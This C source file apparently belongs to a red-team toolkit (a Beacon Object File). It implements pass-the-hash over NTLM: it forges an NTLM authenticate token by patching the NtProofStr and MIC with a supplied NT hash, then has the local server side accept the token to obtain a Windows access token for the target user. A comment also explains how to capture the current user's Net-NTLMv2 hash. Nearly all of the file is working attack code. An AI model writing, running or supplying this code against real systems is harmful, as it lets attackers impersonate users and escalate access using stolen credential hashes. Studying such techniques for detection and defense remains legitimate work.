#include <Ntlm.h>
#include "hmac_md5.c"

/*!
 * @brief
 *	convert a wide string to uppercase
 *
 * @param stringOut
 *	out buffer
 *
 * @param size
 *	size of the string (in/out)
 *
 * @param stringIn
 *	size of the input string
 */
VOID WideStringToUpper(
	OUT PWSTR stringOut,
	IN INT    size,
	IN PWSTR  stringIn
) {
	for ( int i = 0 ; i < size ; i++ ) {
		if ( stringIn[ i ] >= 97 && stringIn[ i ] <= 122 ) {
			stringOut[ i ] = stringIn[ i ] - 32;
		} else {
			stringOut[ i ] = stringIn[ i ];
		}
	}
}

/*!
 * @brief
 *	convert an ansi string to uppercase
 *
 * @param stringOut
 *	out buffer
 *
 * @param size
 *	size of the string (in/out)
 *
 * @param stringIn
 *	size of the input string
 */
VOID CharStringToUpper(
	OUT PCHAR stringOut,
	IN INT    size,
	IN PCHAR  stringIn
) {
	for ( int i = 0 ; i < size ; i++ ) {
		if ( stringIn[ i ] >= 97 && stringIn[ i ] <= 122 ) {
			stringOut[ i ] = stringIn[ i ] - 32;
		} else {
			stringOut[ i ] = stringIn[ i ];
		}
	}
}


VOID ConvertNtHashStringToBytes(
	IN PCHAR  HashString,
	OUT PBYTE NtHash
) {
	CHAR HashStringUpper[ 33 ] = { 0 };

	// check the size is good
	if ( MSVCRT$strlen( HashString ) != 32 ) {
		return;
	}

	// convert to uppercase
	CharStringToUpper( HashStringUpper, 32, HashString );

	// convert to bytes
	for ( BYTE i = 0 ; i < 32 ; i++ ) {
		// check this is valid hex character

		if ( HashStringUpper[ i ] >= 'A' && HashStringUpper[ i ] <= 'F' ) {
			NtHash[ i / 2 ] += ( i % 2 == 0 )
				                   ? ( HashStringUpper[ i ] - 55 ) * 16
				                   : ( HashStringUpper[ i ] - 55 );
		} else if ( HashStringUpper[ i ] >= '0' && HashStringUpper[ i ] <= '9' ) {
			NtHash[ i / 2 ] += ( i % 2 == 0 )
				                   ? ( HashStringUpper[ i ] - 48 ) * 16
				                   : ( HashStringUpper[ i ] - 48 );
		} else {
			// not a hex character
			return;
		}
	}

	return;
}

/*!
 * @brief
 *	calculate the NtOwfv2 of a user
 *	can be calculated by applying a HMAC-MD5 algorithm on the name (uppercase) + domain
 *	using the nt hash as key
 *
 * @param username
 *	the username of the user
 *
 * @param domain
 *	the domain of the user
 *
 * @param passwordHash
 *	the hash of the user
 *
 * @param ntOwfv2
 *	the NtOwfv2 hash of the user
 *	should be a pointer to a 16 bytes buffer
 */
VOID CalculateNtOwfv2(
	IN PUNICODE_STRING username,
	IN PUNICODE_STRING domain,
	IN PBYTE           passwordHash,
	OUT PBYTE          ntOwfv2
) {
	PWSTR name = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY,
	                                    username->Length + domain->Length );

	// convert the username to uppercase
	WideStringToUpper( name, username->Length / 2, username->Buffer );

	// add the domain
	//MSVCRT$wcscpy_s( C_PTR( name ) + username->Length, domain->Length / 2, domain->Buffer );
	MemCopy( C_PTR( name ) + username->Length, domain->Buffer, domain->Length );

	// calculate the key
	hmac_md5( name, username->Length + domain->Length, passwordHash, 16, ntOwfv2 );

	// free the memory
	NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, name );
}

/*!
 * @brief
 *	calculate the challenge response (NtProofStr)
 *
 * @param serverChallenge
 *	server challenge (8 bytes), can be obtained by reading the CHALLENGE token returned by the server
 *
 * @param ntOwfv2
 *	the encryption key, derived from the user's password (NT hash), its domain and its username
 *	calculated using the NtOwfv2 function defined above
 *
 * @param ntlmv2ClientChallenge
 *	the whole client challenge that comes from a partially done AUTHENTICATE token (need to calculate NtProofStr
 *	among other things to finish it). It is not the 8 bytes client challenge
 *	it is all the data contained by that structure: NTLMv2_CLIENT_CHALLENGE
 *
 * @param ntlmv2ClientChallengeSize
 *	the size of the ntlmv2ClientChallenge
 *	as it is dynamic, it should not be calculated using sizeof
 *
 * @param ntProofStr
 *	result of this func, challenge response
 *	should be a pointer to a 16 bytes buffer
 *
 * @return
 */
VOID CalculateNtProofStr(
	IN PBYTE  serverChallenge,
	IN PBYTE  ntOwfv2,
	IN PBYTE  ntlmv2ClientChallenge,
	IN USHORT ntlmv2ClientChallengeSize,
	OUT PBYTE ntProofStr
) {
	// alloc memory to store both buffer at one place and then hash that
	PBYTE buffer = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY,
	                                      8 + ntlmv2ClientChallengeSize );

	// copy memory
	MemCopy( buffer, serverChallenge, 8 );
	MemCopy( buffer + 8, ntlmv2ClientChallenge, ntlmv2ClientChallengeSize );

	// calculate the hash
	hmac_md5( buffer, 8 + ntlmv2ClientChallengeSize, ntOwfv2, 16, ntProofStr );

	// free the memory
	NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, buffer );
}

/*!
 * @brief
 *	calculate the mic for an authentication token
 *
 * @param negToken
 *	the negotiate token
 *
 * @param challengeToken
 *	the challenge token
 *
 * @param authToken
 *	the authenticate token
 *
 * @param ntOwfv2
 *	ntOwfv2 (used as a key), calculated using the internal function CalculateNtOwfv2
 *
 * @param ntProofStr
 *	challenge response (used as a key), calculated using the internal function CalculateNtProofStr
 *
 * @param mic
 *	the calculated mic
 *	should be a pointer to a 16 bytes buffer
 *
 * @return
 */
VOID CalculateMic(
	IN PSecBuffer negToken,
	IN PSecBuffer challToken,
	IN PSecBuffer authToken,
	IN PBYTE      ntOwfv2,
	IN PBYTE      ntProofStr,
	OUT PBYTE     mic
) {
	BYTE  sessionKey[ 16 ] = { 0 };
	PBYTE tokens           = { 0 };

	// calculate the session key
	hmac_md5( ntProofStr, 16, ntOwfv2, 16, sessionKey );

	// create a single block of data
	tokens = NTDLL$RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY,
	                                negToken->cbBuffer + challToken->cbBuffer + authToken->cbBuffer );

	// clear out the existing mic, set 0s
	// here the is no existing mic, because the mem was initialized with HEAP_ZERO_MEMORY
	// but i keep the line there might prevent me from troubleshooting for hours later
	MemSet( ( ( PAUTHENTICATE_TOKEN ) authToken->pvBuffer )->Mic, 0, 16 );

	// copy the tokens
	MemCopy( tokens, negToken->pvBuffer, negToken->cbBuffer );
	MemCopy( tokens + negToken->cbBuffer, challToken->pvBuffer, challToken->cbBuffer );
	MemCopy( tokens + negToken->cbBuffer + challToken->cbBuffer, authToken->pvBuffer, authToken->cbBuffer );

	// calculate the mic
	hmac_md5( tokens, negToken->cbBuffer + challToken->cbBuffer + authToken->cbBuffer, sessionKey, 16, mic );

	// free the data
	NTDLL$RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, tokens );
}

/*!
 * @brief
 *  forge the negotiate token of a NTLM exchange
 *
 * @param username
 *  username to autenticate as
 *
 * @param domain
 *	the domain of the user to authenticate as
 *
 * @param negotiateToken
 *  the negotiate token
 *
 * @param clientCtx
 *  the context of the session (some kind of sessionid, so nobody gets lost)
 *
 * @param clientCreds
 *  credentials handle initiated thanks to the username
 *
 * @return
 *  security status
 */
SECURITY_STATUS ClientCreateNegotiateToken(
	IN PUNICODE_STRING username,
	IN PUNICODE_STRING domain,
	OUT PSecBuffer     negotiateToken,
	OUT PCtxtHandle    clientCtx,
	OUT PCredHandle    clientCreds
) {
	SECURITY_STATUS           status   = { 0 };
	SecBufferDesc             tokens   = { 0 };
	ULONG                     flags    = { 0 };
	SEC_WINNT_AUTH_IDENTITY_W identity = {
		.Domain = domain->Buffer,
		.DomainLength = domain->Length / 2,
		.User = username->Buffer,
		.UserLength = username->Length / 2,
		.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE,
	};

	// get a credentials handle for the client
	if ( ! NT_SUCCESS( status = SECUR32$AcquireCredentialsHandleW(
		NULL,
		L"NTLM",
		SECPKG_CRED_OUTBOUND,
		NULL,
		&identity,
		NULL,
		NULL,
		clientCreds,
		NULL
	) ) ) {
		PRINT_NT_ERROR( "AcquireCredentialsHandleW", status );
		return status;
	}

	// initialize a SecBufferDesc structure to receive the negotiate token
	tokens.ulVersion           = SECBUFFER_VERSION;
	tokens.cBuffers            = 1;
	tokens.pBuffers            = negotiateToken;
	negotiateToken->BufferType = SECBUFFER_TOKEN;

	// get a negotiate token
	if ( ! NT_SUCCESS( status = SECUR32$InitializeSecurityContextW(
		clientCreds,
		NULL,
		NULL,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONNECTION,
		0,
		SECURITY_NATIVE_DREP,
		NULL,
		0,
		clientCtx,
		&tokens,
		&flags,
		NULL
	) ) ) {
		PRINT_NT_ERROR( "InitializeSecurityContextW", status );
		return status;
	}

	return STATUS_SUCCESS;
}

/*!
 * @brief
 *	init the server and get a challenge token
 *
 * @param negotiateToken
 *	negotiate token generated by the client using ClientCreateNegotiate
 *
 * @param challengeToken
 *	the challenge token
 *
 * @param serverCtx
 *  the context of the session (some kind of sessionid, so nobody gets lost)
 *
 * @param serverCreds
 *  credentials handle initiated thanks to the username
 *
 * @return
 *	security status
 */
SECURITY_STATUS ServerCreateChallengeToken(
	IN PSecBuffer   negotiateToken,
	OUT PSecBuffer  challengeToken,
	OUT PCtxtHandle serverCtx,
	OUT PCredHandle serverCreds
) {
	SECURITY_STATUS status          = { 0 };
	ULONG           flags           = { 0 };
	SecBufferDesc   inputTokensDesc = { 0 };
	SecBufferDesc   outputTokenDesc = { 0 };

	// initialize a SecBufferDesc structure to send the negotiate token
	inputTokensDesc.ulVersion = SECBUFFER_VERSION;
	inputTokensDesc.cBuffers  = 1;
	inputTokensDesc.pBuffers  = negotiateToken;

	// initialize a SecBufferDesc structure to receive the challenge token
	outputTokenDesc.ulVersion  = SECBUFFER_VERSION;
	outputTokenDesc.cBuffers   = 1;
	outputTokenDesc.pBuffers   = challengeToken;
	challengeToken->BufferType = SECBUFFER_TOKEN;

	// initialize creds for the server
	// no need for username would be ignored anyway
	if ( ! NT_SUCCESS( status = SECUR32$AcquireCredentialsHandleW(
		NULL,
		L"NTLM",
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		0,
		NULL,
		serverCreds,
		NULL
	) ) ) {
		PRINT_NT_ERROR( "AcquireCredentialsHandleA", status );
		return status;
	}

	// get the challenge token
	if ( ! NT_SUCCESS( status = SECUR32$AcceptSecurityContext(
		serverCreds,
		NULL,
		&inputTokensDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		SECURITY_NATIVE_DREP,
		serverCtx,
		&outputTokenDesc,
		&flags,
		NULL
	) ) ) {
		PRINT_NT_ERROR( "AcceptSecurityContext", status );
		return status;
	}

	return STATUS_SUCCESS;
}

/*!
 * @brief
 *	forge an authenticate token
 *	call InitializeSecurityContext to get an authenticate token and patch some value to be able to pass the hash
 *	the structure of an authenticate token is defined here by microsoft:
 *	https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce
 *
 * @param username
 *	username, if the username is not specified, no patching of the authenticate token will be done
 *
 * @param domain
 *	domain of the user, if not specified, no patching of the authenticate token will be done
 *
 * @param passwordHash
 *	nt hash of the user, if not specified, no patching of the authenticate token will be done
 *
 * @param negToken
 *	negotiate token, if not specified, no patching of the authenticate token will be done
 *
 * @param challToken
 *	challenge token
 *
 * @param clientCtx
 *	client context
 *
 * @param clientCreds
 *	client credentials
 *
 * @param authToken
 *	authenticate token
 *
 * @return
 *	security status
 */
SECURITY_STATUS ClientCreateAuthenticateToken(
	IN OPTIONAL PUNICODE_STRING username,
	IN OPTIONAL PUNICODE_STRING domain,
	IN OPTIONAL PBYTE           passwordHash,
	IN OPTIONAL PSecBuffer      negToken,
	IN PSecBuffer               challToken,
	IN PCtxtHandle              clientCtx,
	IN PCtxtHandle              clientCreds,
	OUT PSecBuffer              authToken
) {
	SECURITY_STATUS          status                = { 0 };
	ULONG                    flags                 = { 0 };
	BYTE                     ntOwfv2[ 16 ]         = { 0 };
	BYTE                     ntProofStr[ 16 ]      = { 0 };
	SecBufferDesc            inputTokensDesc       = { 0 };
	SecBufferDesc            outputTokenDesc       = { 0 };
	PAUTHENTICATE_TOKEN      forgedAuthToken       = { 0 };
	PNT_CHALLENGE_RESPONSE   ntChallengeResponse   = { 0 };
	PNTLMv2_CLIENT_CHALLENGE ntlmv2ClientChallenge = { 0 };

	// initialize a SecBufferDesc structure to send the challenge token
	// LSA will use the negotiate token thanks to client context
	// (the negotiate token is needed to sign the authenticate token)
	inputTokensDesc.ulVersion = SECBUFFER_VERSION;
	inputTokensDesc.cBuffers  = 1;
	inputTokensDesc.pBuffers  = challToken;

	// initialize a SecBufferDesc structure to receive the authenticate token
	outputTokenDesc.ulVersion = SECBUFFER_VERSION;
	outputTokenDesc.cBuffers  = 1;
	outputTokenDesc.pBuffers  = authToken;
	authToken->BufferType     = SECBUFFER_TOKEN;

	// get the authenticate token
	if ( ! NT_SUCCESS( status = SECUR32$InitializeSecurityContextW(
		clientCreds,
		clientCtx,
		NULL,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONNECTION,
		0,
		SECURITY_NATIVE_DREP,
		&inputTokensDesc,
		0,
		clientCtx,
		&outputTokenDesc,
		&flags,
		NULL
	) ) ) {
		PRINT_NT_ERROR( "InitializeSecurityContextW", status );
		return status;
	}

	/* LSA will only create valid token if the user specified via the credential handle is the same as the user
	 * of the current thread. So change the values related to the user identity to make this authenticate token valid
	 * if we specified arbitrary credentials in the cred handle (in order to pth)
	 * to make this token valid, we do not need the password, just the nt hash (this one is used a key to sign things)
	 * that's why we can pass the hash (PTH)
	 *
	 * if the credential handle point to the same user as the current thread, it will create the authenticate token.
	 * we can then use that to get the Net-NTLMv2 hash for the current user of the thread!
	 */

	// if the required data is not specified, quit
	if ( ! username || ! domain || ! passwordHash || ! negToken ) {
		return STATUS_SUCCESS;
	}

	// create some pointers for simplicy
	forgedAuthToken     = authToken->pvBuffer;
	ntChallengeResponse =
			C_PTR( forgedAuthToken ) + forgedAuthToken->NtChallengeResponseFields.NtChallengeResponseBufferOffset;
	ntlmv2ClientChallenge = &ntChallengeResponse->Challenge;

	// calculate the NtOwfv2
	// will only be used as a key for the NtProofStr and Mic
	CalculateNtOwfv2( username, domain, passwordHash, ntOwfv2 );

	// calculate the challenge response
	// will be used as a key for the mic too
	// also part of the authenticate token
	CalculateNtProofStr(
		( ( PCHALLENGE_TOKEN ) ( challToken->pvBuffer ) )->ServerChallenge,
		ntOwfv2,
		ntlmv2ClientChallenge,
		forgedAuthToken->NtChallengeResponseFields.NtChallengeResponseLen - 16,
		ntProofStr
	);

	// copy the challenge response (NtProofStr) to the authenticate token
	MemCopy( ntChallengeResponse->NtProofStr, ntProofStr, 16 );

	// sign the authenticate token by creating the mic
	CalculateMic( negToken, challToken, authToken, ntOwfv2, ntProofStr, forgedAuthToken->Mic );

	return STATUS_SUCCESS;
}

/*!
 * @brief
 *	get an access token thanks to the authenticate token
 *
 * @param authToken
 *	authenticate token
 *
 * @param serverCtx
 *	server context
 *
 * @param serverCreds
 *	server credentials
 *
 * @param accessToken
 *	access token returned by the server
 *
 * @return 
 */
NTSTATUS ServerAcceptAuthenticateToken(
	IN PSecBuffer  authToken,
	IN PCtxtHandle serverCtx,
	IN PCtxtHandle serverCreds,
	OUT PHANDLE    accessToken
) {
	SECURITY_STATUS status          = { 0 };
	ULONG           flags           = { 0 };
	SecBufferDesc   inputTokensDesc = { 0 };

	// prepare the buffer description for the input tokens
	inputTokensDesc.ulVersion = SECBUFFER_VERSION;
	inputTokensDesc.cBuffers  = 1;
	inputTokensDesc.pBuffers  = authToken;

	// ask the server to validate the authenticate token
	// if this one is correct, the server will update its context and place this one in "done" state
	if ( ! NT_SUCCESS( status = SECUR32$AcceptSecurityContext(
		serverCreds,
		serverCtx,
		&inputTokensDesc,
		ASC_REQ_CONNECTION,
		SECURITY_NATIVE_DREP,
		serverCtx,
		NULL,
		&flags,
		NULL
	) ) ) {
		PRINT_NT_ERROR( "AcceptSecurityContext", status );
		return status;
	}

	// use the new server context to get an access token
	if ( ! NT_SUCCESS( status = SECUR32$QuerySecurityContextToken( serverCtx, accessToken ) ) ) {
		PRINT_NT_ERROR( "QuerySecurityContextToken", status );
		return status;
	}

	return STATUS_SUCCESS;
}
